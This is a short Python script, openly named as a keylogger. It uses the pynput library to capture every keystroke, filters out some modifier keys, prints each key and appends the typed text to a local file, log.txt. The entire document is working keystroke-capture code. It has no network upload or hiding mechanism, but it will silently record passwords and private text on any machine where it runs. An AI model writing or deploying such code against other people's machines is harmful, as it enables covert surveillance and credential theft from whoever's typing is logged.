from pynput.keyboard import Listener

def keylogger(key):
    keydata = str(key)

    if keydata == "Key.space":
        keydata = " "
    if keydata == "Key.tab":
        keydata = ""
    if keydata == "Key.backspace":
        keydata = ""
    if keydata == "Key.shift":
        keydata = ""
    if keydata == "Key.shift_l":
        keydata = ""
    if keydata == "Key.ctrl_l":
        keydata = ""
    if keydata == "Key.ctrl_r":
        keydata = ""
    if keydata == "Key.enter":
        keydata = "'\n'"
    if keydata == "Key.alt_l":
        keydata = ""
    if keydata == "Key.alt_r":
        keydata = ""
    if keydata == "Key.down":
        keydata = ""
    if keydata == "Key.up":
        keydata = ""
        
    keydata = keydata.replace("'", "")
    
    print(keydata)
    with open("log.txt", "a") as f:
        f.write(keydata)
        
with Listener(on_press=keylogger) as l:
    l.join()
